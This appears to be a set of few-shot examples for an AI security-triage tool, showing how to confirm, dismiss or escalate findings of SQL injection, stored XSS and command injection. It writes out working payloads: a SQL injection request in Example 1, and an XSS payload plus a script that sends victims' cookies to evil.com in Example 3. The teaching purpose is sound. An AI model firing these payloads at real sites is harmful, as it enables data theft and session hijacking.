# Vulnerability Validation Examples

This document provides few-shot examples showing how to validate security findings. Each example demonstrates the reasoning process for determining if a vulnerability is real and exploitable.

---

## Example 1: Confirmed SQL Injection

### Input Finding

```json
{
  "id": "VULN-001",
  "severity": "HIGH",
  "vulnerability_type": "SQL Injection",
  "file": "src/api/users.js",
  "line_range": "45-49",
  "code_snippet": "const sql = `SELECT * FROM users WHERE name LIKE '%${query}%'`;"
}
```

### Validation Process

**Step 1: Reachability Analysis**

Tracing from entry point:

1. `GET /api/users` → `routes/users.js:12`
2. `usersRouter.get('/')` → `controllers/userController.js:28`
3. `searchUsers(req.query.search)` → `src/api/users.js:45` (vulnerable code)

Reachability: `EXTERNAL` - Accessible via unauthenticated HTTP endpoint.

**Step 2: Control Flow Analysis**

Data flow:

1. Source: `req.query.search` (HTTP query parameter)
2. Passed directly to `searchUsers()` function
3. Interpolated into SQL string without sanitization
4. Executed via `db.query(sql)`

Attacker control: FULL - No validation, encoding, or transformation.

**Step 3: Mitigation Assessment**

- Input validation: NONE
- Framework protection: Raw SQL query, not using ORM
- Security middleware: No WAF or SQL injection protection detected
- Threat model reference: Section 5.2 lists this as a gap

**Step 4: Exploitability Assessment**

Rating: `EASY`

- Standard SQL injection technique
- No special conditions required
- Publicly known attack pattern
- Can be exploited with browser or curl

**Step 5: Proof of Concept**

```json
{
  "payload": "test%' OR '1'='1' --",
  "request": "GET /api/users?search=test%25'%20OR%20'1'%3D'1'%20--",
  "expected_behavior": "Returns users with 'test' in name",
  "actual_behavior": "Returns ALL users in database"
}
```

**Step 6: CVSS Calculation**

- Attack Vector: Network (N)
- Attack Complexity: Low (L)
- Privileges Required: None (N)
- User Interaction: None (N)
- Scope: Unchanged (U)
- Confidentiality: High (H) - Can read all data
- Integrity: High (H) - Can modify data
- Availability: None (N)

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
Score: **9.1 (Critical)**

### Output

```json
{
  "id": "VULN-001",
  "status": "CONFIRMED",
  "original_severity": "HIGH",
  "validated_severity": "CRITICAL",
  "exploitability": "EASY",
  "reachability": "EXTERNAL",
  "existing_mitigations": [],
  "exploitation_path": [
    "Attacker sends GET /api/users?search=<payload>",
    "Express passes query param to searchUsers()",
    "Function interpolates input into SQL template literal",
    "db.query() executes malicious SQL",
    "All user records returned to attacker"
  ],
  "proof_of_concept": {
    "payload": "test%' OR '1'='1' --",
    "request": "GET /api/users?search=test%25'%20OR%20'1'%3D'1'%20--",
    "expected_behavior": "Returns users with 'test' in name",
    "actual_behavior": "Returns ALL users in database"
  },
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
  "cvss_score": 9.1,
  "validation_notes": "Confirmed. Direct string interpolation in SQL with no input validation. Upgraded to CRITICAL due to ease of exploitation and data exposure."
}
```

---

## Example 2: False Positive - Sanitized Input

### Input Finding

```json
{
  "id": "VULN-002",
  "severity": "HIGH",
  "vulnerability_type": "SQL Injection",
  "file": "src/api/products.js",
  "line_range": "78-82",
  "code_snippet": "const sql = `SELECT * FROM products WHERE category = '${category}'`;"
}
```

### Validation Process

**Step 1: Reachability Analysis**

Tracing from entry point:

1. `GET /api/products` → `routes/products.js:15`
2. `productsRouter.get('/')` → `controllers/productController.js:42`
3. `validateRequest(categorySchema)` middleware runs FIRST
4. `getProducts(req.query.category)` → `src/api/products.js:78`

**Step 2: Control Flow Analysis**

Data flow:

1. Source: `req.query.category` (HTTP query parameter)
2. **VALIDATED** by Joi schema middleware at `middleware/validation.js:23`
3. Schema: `Joi.string().valid('electronics', 'clothing', 'food', 'other')`
4. Only passes if input matches allowed enum values
5. Then passed to `getProducts()` function

**Step 3: Mitigation Assessment**

- Input validation: YES - Joi schema restricts to enum values
- The malicious SQL characters cannot pass validation
- Validation happens BEFORE the vulnerable code executes

**Step 4: Exploitability Assessment**

Rating: `NOT_EXPLOITABLE`

- Input is restricted to 4 predefined values
- SQL injection payload would fail Joi validation
- Request would return 400 Bad Request before reaching vulnerable code

### Output

```json
{
  "id": "VULN-002",
  "original_severity": "HIGH",
  "status": "FALSE_POSITIVE",
  "reason": "Input is validated by Joi schema middleware before reaching this code. Schema enforces strict enum values ('electronics', 'clothing', 'food', 'other') which prevents any SQL injection payload from passing through.",
  "evidence": "See middleware/validation.js:23 - Joi.string().valid('electronics', 'clothing', 'food', 'other'). Middleware applied at routes/products.js:15 before handler."
}
```

---

## Example 3: Confirmed XSS with Framework Bypass

### Input Finding

```json
{
  "id": "VULN-003",
  "severity": "MEDIUM",
  "vulnerability_type": "XSS",
  "file": "src/components/UserProfile.jsx",
  "line_range": "34-36",
  "code_snippet": "<div dangerouslySetInnerHTML={{__html: user.bio}} />"
}
```

### Validation Process

**Step 1: Reachability Analysis**

1. Component rendered at `/profile/:userId` route
2. `user.bio` loaded from API: `GET /api/users/:id`
3. Bio field is user-editable in profile settings
4. Rendered without authentication (public profiles)

Reachability: `EXTERNAL` - Any user can set their bio, any visitor can view it.

**Step 2: Control Flow Analysis**

Data flow:

1. Source: User input in profile settings form
2. Stored in database `users.bio` column
3. Retrieved via API
4. Rendered with `dangerouslySetInnerHTML` (explicit XSS risk)

Attacker control: FULL - Users can set arbitrary HTML in bio.

**Step 3: Mitigation Assessment**

- Input validation: NONE on bio field
- Framework protection: BYPASSED - `dangerouslySetInnerHTML` disables React's auto-escaping
- CSP headers: Not configured
- Server-side sanitization: NONE

**Step 4: Exploitability Assessment**

Rating: `EASY`

- Attacker creates account
- Sets bio to `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
- Shares profile link with victim
- Victim's cookies stolen

**Step 5: Proof of Concept**

```json
{
  "payload": "<img src=x onerror=\"alert('XSS')\">",
  "request": "PATCH /api/users/me with body {\"bio\": \"<img src=x onerror=\\\"alert('XSS')\\\">\"}",
  "expected_behavior": "Bio displayed as text or sanitized HTML",
  "actual_behavior": "JavaScript executes in victim's browser"
}
```

**Step 6: CVSS Calculation**

- Attack Vector: Network (N)
- Attack Complexity: Low (L)
- Privileges Required: Low (L) - Need account to set bio
- User Interaction: Required (R) - Victim must view profile
- Scope: Changed (C) - Can affect other users
- Confidentiality: Low (L) - Can steal cookies
- Integrity: Low (L) - Can deface page
- Availability: None (N)

Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
Score: **5.4 (Medium)**

### Output

```json
{
  "id": "VULN-003",
  "status": "CONFIRMED",
  "original_severity": "MEDIUM",
  "validated_severity": "MEDIUM",
  "exploitability": "EASY",
  "reachability": "EXTERNAL",
  "existing_mitigations": [],
  "exploitation_path": [
    "Attacker creates account and navigates to profile settings",
    "Attacker sets bio field to malicious HTML/JS payload",
    "Payload stored in database without sanitization",
    "Victim visits attacker's public profile page",
    "React renders bio with dangerouslySetInnerHTML",
    "Malicious script executes in victim's browser context"
  ],
  "proof_of_concept": {
    "payload": "<img src=x onerror=\"alert('XSS')\">",
    "request": "PATCH /api/users/me with body {\"bio\": \"<img src=x onerror=\\\"alert('XSS')\\\">\"}",
    "expected_behavior": "Bio displayed as text or sanitized HTML",
    "actual_behavior": "JavaScript executes in victim's browser"
  },
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
  "cvss_score": 5.4,
  "validation_notes": "Confirmed stored XSS. The use of dangerouslySetInnerHTML explicitly bypasses React's XSS protection. No server-side sanitization detected."
}
```

---

## Example 4: Needs Manual Review - Complex Data Flow

### Input Finding

```json
{
  "id": "VULN-004",
  "severity": "HIGH",
  "vulnerability_type": "Command Injection",
  "file": "src/workers/imageProcessor.js",
  "line_range": "56-60",
  "code_snippet": "exec(`convert ${inputPath} -resize ${size} ${outputPath}`)"
}
```

### Validation Process

**Step 1: Reachability Analysis**

1. Code is in a background worker, not directly callable
2. Triggered by messages on `image-processing` queue
3. Messages published when users upload images
4. Upload endpoint: `POST /api/upload`

Reachability: `EXTERNAL` (indirect via message queue)

**Step 2: Control Flow Analysis**

Data flow:

1. Source: File upload at `POST /api/upload`
2. Upload handler saves file and publishes to queue
3. Message contains: `{ inputPath, size, outputPath }`
4. Worker receives message and runs exec()

**Problem:** Cannot fully trace the data flow:

- Where does `size` parameter come from?
- Is `inputPath` user-controlled or server-generated?
- What validation happens in the upload handler?
- Are there multiple publishers to this queue?

**Step 3: Mitigation Assessment**

Unknown:

- Upload handler code is in a different service
- Cannot verify if parameters are sanitized before publishing
- Cannot verify if worker validates before exec()

**Step 4: Exploitability Assessment**

Rating: `UNKNOWN`

- If `size` comes from user input without validation → EASY to exploit
- If `inputPath` includes user filename → Potentially exploitable
- Cannot determine without reviewing upload service

### Output

```json
{
  "id": "VULN-004",
  "original_severity": "HIGH",
  "status": "NEEDS_MANUAL_REVIEW",
  "reason": "Complex data flow through message queue prevents full validation. The exec() call is dangerous, but the source of inputPath and size parameters could not be fully traced. These values originate from a different service (upload-service) that publishes to the image-processing queue.",
  "questions_for_reviewer": [
    "Where does the 'size' parameter originate? Is it user-controlled?",
    "Is 'inputPath' derived from user-provided filename or server-generated UUID?",
    "What validation exists in upload-service before publishing to queue?",
    "Are there other publishers to the image-processing queue?"
  ],
  "recommendation": "If any of these parameters are user-controlled, this is a critical command injection vulnerability. Review upload-service code at src/handlers/upload.js."
}
```

---

## Example 5: False Positive - Framework Protection

### Input Finding

```json
{
  "id": "VULN-005",
  "severity": "MEDIUM",
  "vulnerability_type": "SQL Injection",
  "file": "src/repositories/orderRepository.js",
  "line_range": "23-25",
  "code_snippet": "return db.query(`SELECT * FROM orders WHERE user_id = ${userId}`);"
}
```

### Validation Process

**Step 1: Reachability Analysis**

1. Called from `GET /api/orders` endpoint
2. Requires authentication (JWT middleware)
3. `userId` extracted from JWT token: `req.user.id`

**Step 2: Control Flow Analysis**

Data flow:

1. Source: `req.user.id` from JWT token
2. JWT is signed by server with secret key
3. User cannot modify their own `id` in the token
4. Server generates `id` as UUID on registration

Key insight: `userId` is NOT user-controlled input. It comes from a server-signed JWT.

**Step 3: Mitigation Assessment**

- The `userId` value is extracted from a cryptographically signed JWT
- Users cannot forge or modify the JWT payload without the secret
- The `id` is a UUID generated by the server, not user input
- Even though string interpolation is used, the input is trusted

**Step 4: Exploitability Assessment**

Rating: `NOT_EXPLOITABLE`

- Attacker cannot control the `userId` value
- Would need to compromise JWT signing secret
- At that point, SQL injection would be the least of the problems

### Output

```json
{
  "id": "VULN-005",
  "original_severity": "MEDIUM",
  "status": "FALSE_POSITIVE",
  "reason": "The userId parameter is not user-controlled. It is extracted from a server-signed JWT token (req.user.id) after authentication middleware verifies the signature. Users cannot modify their ID in the token without the signing secret. While using parameterized queries would still be best practice, this is not exploitable as SQL injection.",
  "evidence": "Authentication middleware at middleware/auth.js:15 verifies JWT. User ID is set during registration as UUID (services/auth.js:45) and embedded in signed token."
}
```

---

## Key Takeaways

### When to Confirm

- Attacker can control input that reaches vulnerable code
- No sanitization or validation in the data flow
- Framework protections are bypassed or disabled
- Can construct a working proof-of-concept

### When to Mark False Positive

- Input is validated/sanitized before reaching vulnerable code
- Framework provides automatic protection that's enabled
- The "user input" is actually server-controlled (e.g., from signed token)
- Code is unreachable from any entry point

### When to Request Manual Review

- Complex data flows across services or queues
- Cannot fully trace input source
- Validation exists but uncertain if it's sufficient
- Requires domain knowledge to assess impact
